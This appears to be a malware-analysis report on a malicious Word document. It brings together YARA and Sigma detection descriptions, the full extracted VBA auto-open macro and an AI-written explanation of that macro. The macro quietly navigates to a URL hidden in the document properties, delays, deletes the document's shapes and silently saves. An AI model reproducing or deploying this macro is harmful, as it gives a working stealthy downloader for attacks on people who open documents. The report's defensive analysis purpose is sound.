crowdsourced_yara_results.description: This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent.
crowdsourced_yara_results.author: InQuest Labs

crowdsourced_yara_results.description: Detects an Microsoft Office file that contains the AutoOpen Macro function
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

macros.vba_code:
Function kMqHCJ(NYvZK As Single)
Dim rqEYUHpex As Single
rqEYUHpex = Timer + NYvZK
While Timer < rqEYUHpex
DoEvents
Wend
End Function
Function DFCfPg() As String
DFCfPg = ActiveDocument.BuiltInDocumentProperties("Company").Value
End Function
Function oKBFii()
Dim ImdABv As Object
Set ImdABv = CreateObject("InternetExplorer.Application")
ImdABv.Navigate DFCfPg()
ImdABv.Toolbar = False
ImdABv.StatusBar = False
ImdABv.MenuBar = False
Do While ImdABv.Busy: DoEvents: Loop
kMqHCJ ActiveDocument.BuiltInDocumentProperties("Comments").Value
ImdABv.Quit
End Function
Function brxhFz()
Do While ActiveDocument.Shapes.Count > 0
ActiveDocument.Shapes(1).Delete
Loop
End Function
Function HrefMVFh()
ActiveDocument.Save
ActiveDocument.Saved = True
End Function
Function BieqZ()
oKBFii
brxhFz
HrefMVFh
End Function
Sub AutoOpen()
BieqZ
End Sub
Sub Document_Open()
BieqZ
End Sub

sigma_analysis_results.rule_description:
Detects an svchost process spawning an instance of an office application. This happens when the initial word application creates an instance of one of the Office COM objects such as 'Word.Application', 'Excel.Application', etc.
This can be used by malicious actors to create malicious Office documents with macros on the fly. (See vba2clr project in the references)
sigma_analysis_results.rule_title: Suspicious New Instance Of An Office COM Object

crowdsourced_ai_results.analysis:
The macros extracted from the document exhibit several signs of malicious intent. 

The first suspicious behavior is observed in the function "oKBFii". This function creates an instance of Internet Explorer and navigates to a URL that is stored in the document's built-in property "Company". This is a common technique used by malware to download additional payloads or communicate with a command and control server.

Another suspicious behavior is seen in the function "kMqHCJ", which appears to be a sleep function. It takes a value from the document's built-in property "Comments" and uses it as a delay. This could be used to evade detection by security software, as some types of analysis tools may stop monitoring a process if it doesn't perform any actions for a certain period of time.

The function "brxhFz" deletes all shapes from the active document. This could be used to remove any visual indicators of the macro's execution, such as buttons or text boxes added by the macro.

The functions "BieqZ", "AutoOpen", and "Document_Open" are designed to execute the aforementioned functions when the document is opened. This is a common technique used by malware to ensure that the malicious code is executed as soon as the document is opened.

Finally, the function "HrefMVFh" saves the active document and sets its "Saved" property to True. This could be used to prevent the user from receiving a prompt to save changes when they close the document, which might otherwise alert them to the macro's activities.

In conclusion, these macros appear to be designed to download and possibly execute additional malicious payloads, evade detection by security software, and manipulate the document to hide evidence of their activities.
